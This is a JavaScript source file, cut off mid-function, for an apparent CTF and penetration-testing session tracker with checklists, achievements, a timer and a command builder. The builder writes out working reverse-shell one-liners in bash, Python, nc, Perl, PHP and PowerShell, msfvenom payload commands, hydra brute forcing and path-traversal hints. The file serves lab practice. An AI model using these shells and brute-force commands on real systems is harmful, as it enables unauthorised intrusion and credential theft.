'use strict';

/* ═══════════════ UTILITIES ═══════════════════════ */
function debounce(fn, ms){
  let t;
  return function(...args){clearTimeout(t);t=setTimeout(()=>fn.apply(this,args),ms);}
}
const debouncedRenderTab=debounce(()=>renderTab(),200);

/* ═══════════════ SVG ICON HELPERS ══════════════════ */
const _sv='fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"';
const IC = {
  check:    `<svg viewBox="0 0 24 24" ${_sv}><polyline points="20 6 9 17 4 12"/></svg>`,
  flag:     `<svg viewBox="0 0 24 24" ${_sv}><path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z"/><line x1="4" y1="22" x2="4" y2="15"/></svg>`,
  key:      `<svg viewBox="0 0 24 24" ${_sv}><path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"/></svg>`,
  hash:     `<svg viewBox="0 0 24 24" ${_sv}><line x1="4" y1="9" x2="20" y2="9"/><line x1="4" y1="15" x2="20" y2="15"/><line x1="10" y1="3" x2="8" y2="21"/><line x1="16" y1="3" x2="14" y2="21"/></svg>`,
  zap:      `<svg viewBox="0 0 24 24" ${_sv}><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>`,
  radio:    `<svg viewBox="0 0 24 24" ${_sv}><circle cx="12" cy="12" r="2"/><path d="M16.24 7.76a6 6 0 0 1 0 8.49m-8.48-.01a6 6 0 0 1 0-8.49m11.31-2.82a10 10 0 0 1 0 14.14m-14.14 0a10 10 0 0 1 0-14.14"/></svg>`,
  file:     `<svg viewBox="0 0 24 24" ${_sv}><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>`,
  search:   `<svg viewBox="0 0 24 24" ${_sv}><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>`,
  chevron:  `<svg viewBox="0 0 24 24" ${_sv}><polyline points="9 18 15 12 9 6"/></svg>`,
  trash:    `<svg viewBox="0 0 24 24" ${_sv}><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v2"/></svg>`,
  lightbulb:`<svg viewBox="0 0 24 24" ${_sv}><line x1="9" y1="18" x2="15" y2="18"/><line x1="10" y1="22" x2="14" y2="22"/><path d="M15.09 14c.18-.98.65-1.74 1.41-2.5A4.65 4.65 0 0 0 18 8 6 6 0 0 0 6 8c0 1 .23 2.23 1.5 3.5A4.61 4.61 0 0 1 8.91 14"/></svg>`,
  arrow_up: `<svg viewBox="0 0 24 24" ${_sv}><line x1="12" y1="19" x2="12" y2="5"/><polyline points="5 12 12 5 19 12"/></svg>`,
};

/* ═══════════════ DATA ══════════════════ */
const PHASES = [
  {id:'recon',name:'Recon & Enumeration',color:'#5b8def',icon:'search',items:[
    {id:'r1',text:'Read room description & objectives',hint:'Note all flags required and any given context before you start. Understand what you\'re solving.',tools:['browser']},
    {id:'r2',text:'Initial nmap scan (top ports)',hint:'nmap -sV -sC --top-ports 1000 -T4 <IP> — get a quick lay of the land.',tools:['nmap']},
    {id:'r3',text:'Web fingerprinting',hint:'whatweb, Wappalyzer — identify CMS, frameworks, and server version.',tools:['whatweb','nikto']},
    {id:'r4',text:'Directory & VHost bruteforce',hint:'gobuster/ffuf with raft-medium-directories; fuzz Host header for vhosts.',tools:['gobuster','ffuf']},
    {id:'r5',text:'OSINT search on target',hint:'Google dorking, crt.sh, Shodan, GitHub — any exposed assets or leaked creds.',tools:['Google','Shodan','crt.sh']},
  ]},
  {id:'exploit',name:'Exploitation',color:'#f87171',icon:'zap',items:[
    {id:'x1',text:'Identify vulnerability class',hint:'What category is this? SQLi, XSS, IDOR, RCE, crypto, stego? Map your attack surface first.',tools:['Burp Suite']},
    {id:'x2',text:'Find or craft exploit',hint:'SearchSploit, GitHub PoC, manual crafting — match exact version strings.',tools:['searchsploit','github']},
    {id:'x3',text:'Test exploit in safe environment',hint:'If it is destructive, understand the PoC fully before running it.',tools:[]},
    {id:'x4',text:'Gain foothold / access',hint:'Execute the exploit, catch a shell, establish a session, retrieve first proof.',tools:['nc','rlwrap']},
    {id:'x5',text:'Capture first flag',hint:'cat flag.txt / retrieve the value. Log it in Findings immediately.',tools:['cat']},
  ]},
  {id:'privesc',name:'Privilege Escalation / Lateral',color:'#fbbf24',icon:'arrow_up',items:[
    {id:'p1',text:'Manual enumeration (users, sudo, SUID)',hint:'id, sudo -l, find / -perm -4000, env, crontab -l, ss -tnlp',tools:['find','sudo']},
    {id:'p2',text:'Automated scan (LinPEAS / WinPEAS)',hint:'Transfer via python3 -m http.server and run. Read ALL output carefully.',tools:['linpeas','winpeas']},
    {id:'p3',text:'Identify privilege escalation vector',hint:'Match findings against GTFOBins, HackTricks, or known techniques.',tools:['GTFOBins']},
    {id:'p4',text:'Execute privilege escalation',hint:'Run the exploit, token impersonation, kernel exploit, or path hijack.',tools:[]},
    {id:'p5',text:'Capture root / admin flag',hint:'cat /root/root.txt or equivalent. Log it in Findings.',tools:['cat']},
  ]},
  {id:'post',name:'Cleanup & Documentation',color:'#a78bfa',icon:'file',items:[
    {id:'po1',text:'Note all credentials found',hint:'Username:password pairs, hashes, SSH keys — log everything in Findings.',tools:[]},
    {id:'po2',text:'Screenshot key findings',hint:'Capture terminal output, web UI screenshots, flags, proof of root.',tools:[]},
    {id:'po3',text:'Write attack chain summary',hint:'Step-by-step: how did you get in? What vector? How did you escalate?',tools:[]},
    {id:'po4',text:'Update writeup in Study Lab',hint:'Go to Study Lab → Writeup Journal and document this challenge.',tools:[]},
    {id:'po5',text:'Mark as Pwned',hint:'Click the "Mark as Pwned" button in the Overview tab.',tools:[]},
  ]},
];

const TYPE_CHECKLISTS = {
  room:     null, // no type-specific items for generic rooms
  web: {name:'Web', color:'#67e8f9', items:[
    {id:'wc1',text:'Source code review (view-source:, DevTools)',hint:'Check for comments, API keys, hidden fields, and logic clues.'},
    {id:'wc2',text:'robots.txt, sitemap.xml, .htaccess',hint:'Often reveals hidden directories and disallowed paths.'},
    {id:'wc3',text:'Cookie inspection & manipulation',hint:'Check HttpOnly/Secure flags, JWT tokens, session ID patterns.'},
    {id:'wc4',text:'SQL injection testing',hint:'Test all params manually first, then sqlmap. Check error messages.',tools:['sqlmap','Burp Suite']},
    {id:'wc5',text:'XSS testing',hint:'Inject into inputs, URL params, headers. Test stored and reflected.',tools:['XSStrike','Burp Suite']},
    {id:'wc6',text:'IDOR / BOLA testing',hint:'Change user IDs, object references. Predict/enumerate patterns.'},
    {id:'wc7',text:'File upload bypass',hint:'Extension filter, MIME type spoofing, double extension, null byte.'},
    {id:'wc8',text:'SSRF / LFI / Path traversal',hint:'php://filter, file://, ../../../etc/passwd wrappers.'},
    {id:'wc9',text:'JWT / auth bypass',hint:'Check alg:none, weak secret, kid injection, token expiry.'},
    {id:'wc10',text:'API endpoint enumeration',hint:'JS files, Burp sitemap, wordlist fuzzing for undocumented endpoints.'},
  ]},
  crypto: {name:'Crypto', color:'#a78bfa', items:[
    {id:'cc1',text:'Identify cipher type',hint:'Use dcode.fr cipher identifier or AperiSolve for encoded data.'},
    {id:'cc2',text:'Check for classical ciphers',hint:'Caesar, Vigenere, Rail Fence, Playfair, Atbash — frequency analysis.'},
    {id:'cc3',text:'RSA analysis',hint:'Check for small n, common factors, low public exponent, Wiener attack.'},
    {id:'cc4',text:'Hash identification',hint:'hashid / hash-identifier to determine hash algorithm.',tools:['hashid']},
    {id:'cc5',text:'Frequency analysis',hint:'English letter frequency — useful for substitution ciphers.'},
    {id:'cc6',text:'XOR / OTP testing',hint:'Try XOR with key, look for repeating key patterns (Kasiski test).'},
    {id:'cc7',text:'Base encoding decode',hint:'Base64, Base32, Base58, Base85 — try all, check for padding.'},
    {id:'cc8',text:'CyberChef analysis',hint:'Paste into CyberChef Magic mode for automatic recipe detection.'},
    {id:'cc9',text:'Known CTF crypto techniques',hint:'Padding oracle, bit flipping, ECB block shuffling, timing attacks.'},
    {id:'cc10',text:'Brute force weak keys',hint:'Short key space? Wordlist attack with hashcat or custom script.',tools:['hashcat','john']},
  ]},
  forensics: {name:'Forensics', color:'#fbbf24', items:[
    {id:'fc1',text:'File type & magic bytes check',hint:'file cmd, hexdump first 16 bytes — is the extension lying?',tools:['file','xxd']},
    {id:'fc2',text:'Metadata analysis',hint:'exiftool — GPS, author, timestamps, software, embedded thumbnails.',tools:['exiftool']},
    {id:'fc3',text:'Strings extraction',hint:'strings -a -n 8 file | grep -i flag — look for readable content.',tools:['strings']},
    {id:'fc4',text:'Steganography check',hint:'steghide, zsteg, stegsolve, binwalk — check image layers and embedded files.',tools:['steghide','zsteg','binwalk']},
    {id:'fc5',text:'Memory dump analysis',hint:'Volatility — pslist, netscan, cmdline, dumpfiles, hashdump.',tools:['volatility']},
    {id:'fc6',text:'Network pcap analysis',hint:'Wireshark — filter by protocol, follow TCP streams, export objects.',tools:['wireshark','tshark']},
    {id:'fc7',text:'Filesystem / disk image',hint:'Mount with losetup / autopsy. Check deleted files, slack space.',tools:['autopsy','sleuthkit']},
    {id:'fc8',text:'Deleted files recovery',hint:'foremost, scalpel, photorec — carve by file signature.',tools:['foremost','scalpel']},
    {id:'fc9',text:'Timeline analysis',hint:'Correlate timestamps across file system, logs, and memory artifacts.'},
    {id:'fc10',text:'Keyword search',hint:'grep -r "flag{" or strings across all extracted artifacts.'},
  ]},
  osint: {name:'OSINT', color:'#34d399', items:[
    {id:'oc1',text:'Username search (Sherlock)',hint:'sherlock <username> — find the account across 400+ platforms.',tools:['sherlock']},
    {id:'oc2',text:'Google dorking',hint:'site:, inurl:, filetype:, "exact phrase" — find indexed sensitive info.'},
    {id:'oc3',text:'Reverse image search',hint:'Google Images, TinEye, Yandex — trace origin and related content.'},
    {id:'oc4',text:'Social media search',hint:'Twitter, LinkedIn, Instagram, Reddit — look for posts, locations, connections.'},
    {id:'oc5',text:'WHOIS / DNS lookup',hint:'whois, dig, nslookup — registrant, nameservers, historical records.',tools:['whois','dig']},
    {id:'oc6',text:'Wayback Machine',hint:'web.archive.org — find deleted pages, old configs, exposed files.'},
    {id:'oc7',text:'Email investigation',hint:'Hunter.io, Phonebook.cz — email format discovery and verification.'},
    {id:'oc8',text:'Geolocation clues',hint:'Geolocate images via landmarks, shadows, sun angle, map tiles.'},
    {id:'oc9',text:'LinkedIn / professional search',hint:'Company structure, employee names, job postings, tech stack clues.'},
    {id:'oc10',text:'Metadata from public files',hint:'exiftool on PDFs, images, Office docs — GPS, authors, software used.',tools:['exiftool']},
  ]},
  network: {name:'Network', color:'#5b8def', items:[
    {id:'nc1',text:'Full port scan',hint:'nmap -p- --min-rate 5000 -T4 <IP> — all 65535 ports.',tools:['nmap']},
    {id:'nc2',text:'Service & version detection',hint:'nmap -sV -sC on all open ports.',tools:['nmap']},
    {id:'nc3',text:'UDP scan',hint:'nmap -sU --top-ports 100 — finds DNS, SNMP, TFTP, NTP.',tools:['nmap']},
    {id:'nc4',text:'SMB enumeration',hint:'smbclient, enum4linux, crackmapexec — shares, null session, users.',tools:['smbclient','enum4linux']},
    {id:'nc5',text:'SNMP enumeration',hint:'snmpwalk -v2c -c public <IP> — OIDs, system info, running procs.',tools:['snmpwalk']},
    {id:'nc6',text:'LDAP / Active Directory',hint:'ldapsearch for users, groups, SPNs, password policy.',tools:['ldapsearch','bloodhound']},
    {id:'nc7',text:'Banner grabbing',hint:'nc / curl -v — grab service banners to ID versions.',tools:['nc','curl']},
    {id:'nc8',text:'Packet capture analysis',hint:'tcpdump / Wireshark — capture traffic for credentials, tokens.',tools:['tcpdump','wireshark']},
    {id:'nc9',text:'ARP / host discovery',hint:'arp-scan, netdiscover — find live hosts on the segment.',tools:['arp-scan','netdiscover']},
    {id:'nc10',text:'Default credentials',hint:'Check admin:admin, root:toor — service-specific defaults.',tools:['hydra']},
  ]},
  misc: {name:'Misc', color:'#f87171', items:[
    {id:'mc1',text:'Read the challenge description carefully',hint:'Most hints are in the description. Re-read it multiple times.'},
    {id:'mc2',text:'Check file type / encoding',hint:'file, hexdump, base64 — never assume the format.',tools:['file','xxd']},
    {id:'mc3',text:'Try common CTF patterns',hint:'ROT13, base64, hex, binary — the simplest answer is often right.'},
    {id:'mc4',text:'Google the error / output',hint:'Exact error messages, unusual strings — someone has seen this before.'},
    {id:'mc5',text:'CyberChef Magic mode',hint:'Drop the data in — let CyberChef suggest transformations.'},
    {id:'mc6',text:'Check for hidden files / data',hint:'binwalk, steghide, alternative data streams (ADS on Windows).'},
    {id:'mc7',text:'Brute force flag format',hint:'Try flag{}, FLAG{}, ctf{} — check if format is given.'},
    {id:'mc8',text:'Decode numeric sequences',hint:'ASCII decimal, octal, binary — convert systematically.',},
    {id:'mc9',text:'Check for script/automation opportunity',hint:'Repetitive tasks are often scripted. Write a quick Python loop.'},
    {id:'mc10',text:'Ask for a nudge (hint)',hint:'Use the room\'s hint system or community — you\'ve earned it after trying.'},
  ]},
};

const COMMANDS = [
  {id:'nmap',name:'nmap',desc:'Port scanner',params:[{id:'target',label:'Target IP',type:'text',placeholder:'10.10.11.227'},{id:'ports',label:'Ports',type:'sel',opts:['-p-','--top-ports 1000','--top-ports 100','-p 80,443,8080'],def:'-p-'},{id:'speed',label:'Timing',type:'sel',opts:['-T2','-T3','-T4','-T5'],def:'-T4'},{id:'rate',label:'Min Rate',type:'text',placeholder:'5000'}],flags:['-sV','-sC','-O','-A','--open','-sU','--script vuln','-oA output'],build:(p,f)=>`nmap ${p.ports||'-p-'} ${p.speed||'-T4'} ${p.rate?'--min-rate '+p.rate:''} ${f.join(' ')} ${p.target||'<TARGET>'} -oN nmap_scan.txt`.replace(/\s+/g,' ').trim(),tip:'Run top-1000 ports first, then full -p- scan in background.'},
  {id:'gobuster',name:'gobuster',desc:'Directory fuzzer',params:[{id:'url',label:'Target URL',type:'text',placeholder:'http://10.10.11.227'},{id:'wordlist',label:'Wordlist',type:'sel',opts:['/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt','/usr/share/wordlists/dirb/common.txt','/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt'],def:'/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt'},{id:'ext',label:'Extensions',type:'text',placeholder:'php,html,txt,bak'},{id:'threads',label:'Threads',type:'text',placeholder:'50'}],flags:['-k','-r','--no-error','-b 403,404'],build:(p,f)=>`gobuster dir -u ${p.url||'<URL>'} -w ${p.wordlist||'<WORDLIST>'} ${p.ext?'-x '+p.ext:''} -t ${p.threads||50} ${f.map(f=>f.split(' ')[0]).join(' ')}`.replace(/\s+/g,' ').trim(),tip:'Add -x php,html,txt for common web extensions.'},
  {id:'ffuf',name:'ffuf',desc:'Fast web fuzzer',params:[{id:'url',label:'URL (FUZZ keyword)',type:'text',placeholder:'http://10.10.11.227/FUZZ'},{id:'wordlist',label:'Wordlist',type:'sel',opts:['/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt','/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt','/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt'],def:'/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt'},{id:'fc',label:'Filter Codes',type:'text',placeholder:'404,403'},{id:'threads',label:'Threads',type:'text',placeholder:'40'}],flags:['-recursion -recursion-depth 2','-e .php,.html,.txt','-c','-v','-mc all'],build:(p,f)=>`ffuf -w ${p.wordlist||'<WORDLIST>'}:FUZZ -u ${p.url||'<URL>'} ${p.fc?'-fc '+p.fc:''} -t ${p.threads||40} ${f.map(f=>f.split(' ')[0]).join(' ')}`.replace(/\s+/g,' ').trim(),tip:'For vhost fuzzing: -H "Host: FUZZ.domain.com" with subdomain wordlist.'},
  {id:'sqlmap',name:'sqlmap',desc:'SQLi automation',params:[{id:'target',label:'URL',type:'text',placeholder:'http://target.com/page?id=1'},{id:'dbms',label:'DBMS',type:'sel',opts:['(auto)','--dbms=mysql','--dbms=mssql','--dbms=postgresql','--dbms=sqlite'],def:'(auto)'},{id:'level',label:'Level',type:'sel',opts:['--level=1','--level=2','--level=3','--level=5'],def:'--level=3'},{id:'risk',label:'Risk',type:'sel',opts:['--risk=1','--risk=2','--risk=3'],def:'--risk=2'}],flags:['--dbs','--tables -D db','--dump -D db -T tbl','-p param','--forms','--batch','--random-agent'],build:(p,f)=>`sqlmap -u "${p.target||'<URL>'}" ${p.dbms.startsWith('--')?p.dbms:''} ${p.level||'--level=3'} ${p.risk||'--risk=2'} ${f.map(f=>f.split(' ')[0]).join(' ')}`.replace(/\s+/g,' ').trim(),tip:'Add --batch to skip all interactive prompts.'},
  {id:'hydra',name:'hydra',desc:'Credential brute force',params:[{id:'target',label:'Target',type:'text',placeholder:'10.10.11.227'},{id:'service',label:'Service',type:'sel',opts:['ssh','ftp','rdp','smb','mysql','http-post-form','smtp','telnet'],def:'ssh'},{id:'user',label:'Username',type:'text',placeholder:'admin'},{id:'pass',label:'Password List',type:'sel',opts:['/usr/share/wordlists/rockyou.txt','/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt','/usr/share/wordlists/fasttrack.txt'],def:'/usr/share/wordlists/rockyou.txt'},{id:'threads',label:'Threads',type:'text',placeholder:'16'}],flags:['-V','-f','-e nsr'],build:(p,f)=>{const u=p.user?'-l '+p.user:'-L users.txt';return`hydra -t ${p.threads||16} ${u} -P ${p.pass||'<WORDLIST>'} ${f.map(f=>f.split(' ')[0]).join(' ')} ${p.target||'<TARGET>'} ${p.service||'ssh'}`.replace(/\s+/g,' ').trim()},tip:'Use max 4 threads for SSH to avoid account lockout.'},
  {id:'msfvenom',name:'msfvenom',desc:'Payload generator',params:[{id:'lhost',label:'Your IP (LHOST)',type:'text',placeholder:'10.10.14.5'},{id:'lport',label:'Your Port (LPORT)',type:'text',placeholder:'4444'},{id:'payload',label:'Payload',type:'sel',opts:['linux/x64/shell_reverse_tcp','linux/x64/meterpreter/reverse_tcp','windows/x64/shell_reverse_tcp','windows/x64/meterpreter/reverse_tcp','php/reverse_php'],def:'linux/x64/shell_reverse_tcp'},{id:'fmt',label:'Format',type:'sel',opts:['elf','exe','php','raw','py','asp','aspx','war'],def:'elf'},{id:'out',label:'Output File',type:'text',placeholder:'shell.elf'}],flags:['-b "\\x00\\x0a\\x0d"','EXITFUNC=thread'],build:(p,f)=>`msfvenom -p ${p.payload||'linux/x64/shell_reverse_tcp'} LHOST=${p.lhost||'<LHOST>'} LPORT=${p.lport||4444} -f ${p.fmt||'elf'} ${f.map(f=>f.split(' ')[0]).join(' ')} -o ${p.out||'shell.elf'}`.replace(/\s+/g,' ').trim(),tip:'Start your listener before the payload: rlwrap nc -lvnp 4444'},
  {id:'revshell',name:'revshell',desc:'Reverse shell one-liners',params:[{id:'lhost',label:'Your IP',type:'text',placeholder:'10.10.14.5'},{id:'lport',label:'Your Port',type:'text',placeholder:'4444'},{id:'type',label:'Shell Type',type:'sel',opts:['bash','python3','nc (mkfifo)','perl','php','powershell'],def:'bash'}],flags:[],build:(p,f)=>{const h=p.lhost||'<LHOST>',pt=p.lport||4444;const s={'bash':`bash -c 'bash -i >& /dev/tcp/${h}/${pt} 0>&1'`,'python3':`python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${h}",${pt}));[os.dup2(s.fileno(),i) for i in range(3)];subprocess.call(["/bin/sh"])'`,'nc (mkfifo)':`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ${h} ${pt} >/tmp/f`,'perl':`perl -e 'use Socket;$i="${h}";$p=${pt};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'`,'php':`php -r '$sock=fsockopen("${h}",${pt});exec("/bin/sh -i <&3 >&3 2>&3");'`,'powershell':`powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('${h}',${pt});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r+='PS '+(pwd).Path+'> ';$x=([text.encoding]::ASCII).GetBytes($r);$s.Write($x,0,$x.Length)}"` };return s[p.type||'bash']||''},tip:'After catching shell: python3 -c "import pty;pty.spawn(\'/bin/bash\')" → Ctrl+Z → stty raw -echo → fg'},
];

const ACHIEVEMENTS = [
  {id:'first_blood', name:'First Blood',    desc:'Start your first session',              icon:'flag',    xp:25,  check:s=>s.targets>=1},
  {id:'flag_hunter', name:'Flag Hunter',    desc:'Capture your first flag',               icon:'flag',    xp:50,  check:s=>s.flags>=1},
  {id:'double_flag', name:'Double Tap',     desc:'Get user + root on one machine',        icon:'flag',    xp:75,  check:s=>s.userFlags>=1&&s.rootFlags>=1},
  {id:'first_pwn',   name:'Rooted',         desc:'Mark your first session as pwned',      icon:'key',     xp:100, check:s=>s.pwned>=1},
  {id:'cred_hunter', name:'Cred Hunter',    desc:'Log 3 sets of credentials',             icon:'key',     xp:50,  check:s=>s.creds>=3},
  {id:'note_taker',  name:'Note Taker',     desc:'Write 5 notes across targets',          icon:'file',    xp:30,  check:s=>s.notes>=5},
  {id:'checklist50', name:'Halfway There',  desc:'Complete 50 checklist items',           icon:'check',   xp:60,  check:s=>s.checks>=50},
  {id:'multi_tgt',   name:'Full Scope',     desc:'Have 3 active sessions',                icon:'search',  xp:40,  check:s=>s.targets>=3},
  {id:'hash_dump',   name:'Hash Dump',      desc:'Log 5 hashes across all targets',       icon:'hash',    xp:50,  check:s=>s.hashes>=5},
  {id:'five_pwn',    name:'Serial Rooter',  desc:'Pwn 5 sessions',                        icon:'key',     xp:200, check:s=>s.pwned>=5},
  {id:'hour1',       name:'Night Owl',      desc:'1 hour total hacking time',             icon:'search',  xp:60,  check:s=>s.secs>=3600},
  {id:'hour10',      name:'Dedicated',      desc:'10 hours total hacking time',           icon:'zap',     xp:150, check:s=>s.secs>=36000},
  {id:'streak3',     name:'On A Roll',      desc:'3 day hack streak',                     icon:'zap',     xp:80,  check:s=>s.streak>=3},
  {id:'streak7',     name:'Week Warrior',   desc:'7 day hack streak',                     icon:'zap',     xp:200, check:s=>s.streak>=7},
];

const PARSERS = {
  recon:   {label:'Paste nmap or web tool output to auto-parse',parse:parseNmap},
  exploit: {label:'Paste credentials, SQLmap output, or CVE details to parse',parse:parseExploit},
  privesc: {label:'Paste sudo -l, SUID list, or linpeas snippet to parse',parse:parsePrivesc},
  post:    {label:'Paste /etc/shadow or hashes to identify and parse',parse:parsePost},
};

/* ═══════════════ STATE ══════════════════ */
const K = 'hacklog_v1';
let targets=[], activeId=null, activeTab='overview', selCmd=null, noteIdx=null, pendingDel=null, clFilter='all', clSearch='', clTypeFilter=null, phaseOutputs={};
let timerIv=null;

/* ═══════════════ THEME ══════════════════ */
function toggleTheme(){
  const current = document.documentElement.getAttribute('data-theme');
  // Cycle: light → dark → clean-dark → light
  const cycle = {light:'dark', dark:'clean-dark', 'clean-dark':'light'};
  const next = cycle[current] || 'dark';
  document.documentElement.setAttribute('data-theme', next);
  localStorage.setItem(K+'_theme', next);
}
function loadTheme(){
  let saved = localStorage.getItem(K+'_theme') || 'dark';
  if(saved === 'hacker') saved = 'dark'; // migrate old hacker theme
  document.documentElement.setAttribute('data-theme', saved);
}

/* ═══════════════ PERSIST ════════════════ */
const save=()=>localStorage.setItem(K+'_d',JSON.stringify(targets));
function load(){
  try{targets=JSON.parse(localStorage.getItem(K+'_d')||'[]')}catch{targets=[]}
}
const esc=s=>String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
const getT=()=>targets.find(t=>t.id===activeId);
const progress=t=>{const tot=PHASES.reduce((s,p)=>s+p.items.length,0);const done=Object.values(t.checks||{}).filter(Boolean).length;return{tot,done,pct:Math.round(done/tot*100)}};
const E=id=>document.getElementById(id);
const rAF=requestAnimationFrame;

/* ═══════════════ XP / LEVEL ═════════════ */
const XP_LEVELS=[0,200,450,800,1250,1800,2500,3300,4200,5200,6500];
const LVL_TITLES=['Newcomer','Script Kiddie','Pen Tester','Exploit Dev','Red Teamer','Threat Actor','APT Member','0day Broker','Elite Hacker','God Mode'];
const getXP=()=>parseInt(localStorage.getItem(K+'_xp')||'0');
const setXP=v=>localStorage.setItem(K+'_xp',String(v));
const getUnlocked=()=>{try{return JSON.parse(localStorage.getItem(K+'_ach')||'[]')}catch{return[]}};
const setUnlocked=a=>localStorage.setItem(K+'_ach',JSON.stringify(a));

function getLvl(xp){
  let l=1;for(let i=1;i<XP_LEVELS.length;i++){if(xp>=XP_LEVELS[i])l=i+1;else break}
  const cur=XP_LEVELS[Math.min(l-1,XP_LEVELS.length-1)];
  const nxt=XP_LEVELS[Math.min(l,XP_LEVELS.length-1)];
  const pct=nxt>cur?Math.round((xp-cur)/(nxt-cur)*100):100;
  return{l,pct,xp,nxt,title:LVL_TITLES[Math.min(l-1,LVL_TITLES.length-1)]};
}

function grantXP(amt,lbl){
  const nxp=getXP()+amt;setXP(nxp);updateNavXP();
  const{pct}=getLvl(nxp);
  const pop=E('xpPop'),val=E('xpPopVal'),fill=E('xpPopFill');
  if(pop&&val&&fill){
    val.textContent=`+${amt} XP${lbl?' — '+lbl:''}`;
    pop.classList.add('show');
    setTimeout(()=>{fill.style.width=pct+'%'},50);
    setTimeout(()=>{pop.classList.remove('show');fill.style.width='0%'},2800);
  }
  checkAch();
}

function updateNavXP(){
  const xp=getXP();const{l,pct}=getLvl(xp);
  const le=E('navLvl'),be=E('navXpBar'),pe=E('navXpPts');
  if(le)le.textContent=`L${l}`;if(be)be.style.width=pct+'%';if(pe)pe.textContent=`${xp}xp`;
}

function getStats(){
  const af=targets.flatMap(t=>t.findings||[]);
  const an=targets.flatMap(t=>t.notes||[]);
  const ac=targets.flatMap(t=>Object.values(t.checks||{}).filter(Boolean));
  return{
    targets:targets.length,flags:af.filter(f=>f.type.startsWith('flag')).length,
    userFlags:af.filter(f=>f.type==='flag_user').length,rootFlags:af.filter(f=>f.type==='flag_root').length,
    pwned:targets.filter(t=>t.completed).length,creds:af.filter(f=>f.type==='creds').length,
    notes:an.length,checks:ac.length,hashes:af.filter(f=>f.type==='hash').length,
    secs:targets.reduce((s,t)=>s+getSecs(t),0),streak:getStreak(),
  };
}

function checkAch(){
  const st=getStats();const ul=getUnlocked();const nu=[];
  for(const a of ACHIEVEMENTS){if(!ul.includes(a.id)&&a.check(st)){ul.push(a.id);nu.push(a)}}
  if(nu.length){setUnlocked(ul);nu.forEach((a,i)=>setTimeout(()=>{toast(`Achievement unlocked: ${a.name}! +${a.xp} XP`,3200);setXP(getXP()+a.xp);updateNavXP()},i*900))}
  updateNavXP();
}

function openAch(){
  const ul=getUnlocked();const xp=getXP();const{l,pct,nxt}=getLvl(xp);
  E('achSub').textContent=`${ul.length} / ${ACHIEVEMENTS.length} unlocked`;
  E('achLvl').textContent=l;E('achXpLbl').textContent=`${xp} / ${nxt} XP`;
  E('achXpBar').style.width=pct+'%';
  E('achGrid').innerHTML=ACHIEVEMENTS.map(a=>{
    const u=ul.includes(a.id);
    return`<div class="ach-card${u?' unlocked':' locked'}">
      <div class="ach-icon-wrap" style="${u?'background:var(--amberbg);color:var(--amber)':'color:var(--t3)'}">${IC[a.icon]||IC.flag}</div>
      <div><div class="ach-name">${esc(a.name)}</div><div class="ach-desc">${esc(a.desc)}</div><div class="ach-pts">+${a.xp} XP${u?' · Earned':''}</div></div>
    </div>`;
  }).join('');
  const bg=E('achModal');bg.style.display='flex';rAF(()=>rAF(()=>bg.classList.add('open')));
}
const closeAch=()=>{const bg=E('achModal');bg.classList.remove('open');bg.addEventListener('transitionend',()=>{bg.style.display='none'},{once:true})};

/* ═══════════════ TIMER ══════════════════ */
const getSecs=t=>{if(!t)return 0;const acc=t.timerAccumulated||0;return t.timerRunning&&t.timerStartedAt?acc+Math.floor((Date.now()-t.timerStartedAt)/1000):acc};
const fmtT=s=>{const h=Math.floor(s/3600),m=Math.floor((s%3600)/60),sc=s%60;return`${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(sc).padStart(2,'0')}`};
const fmtTSh=s=>{const h=Math.floor(s/3600),m=Math.floor((s%3600)/60);if(h>0)return`${h}h ${m}m`;if(m>0)return`${m}m`;return`${s}s`};

let lastActivity=0;
function startTimerLoop(){
  if(timerIv)clearInterval(timerIv);
  timerIv=setInterval(()=>{
    const t=getT();
    if(t&&t.timerRunning){const sv=E('sessionTimerVal');if(sv){sv.textContent=fmtT(getSecs(t));sv.classList.remove('paused');}}
    const running=targets.find(t=>t.timerRunning);
    const pill=E('navTimerPill'),pv=E('navTimerVal');
    if(running&&pill&&pv){pill.style.display='flex';pv.textContent=fmtT(getSecs(running));}
    else if(pill)pill.style.display='none';
    const now=Date.now();
    if(now-lastActivity>=60000&&running){
      lastActivity=now;
      const dk=new Date().toISOString().slice(0,10);
      let hm;try{hm=JSON.parse(localStorage.getItem(K+'_hm')||'{}')}catch{hm={}}
      hm[dk]=(hm[dk]||0)+1;localStorage.setItem(K+'_hm',JSON.stringify(hm));
      updateStreak();
    }
  },1000);
}

function togglePause(){
  const t=getT();if(!t)return;
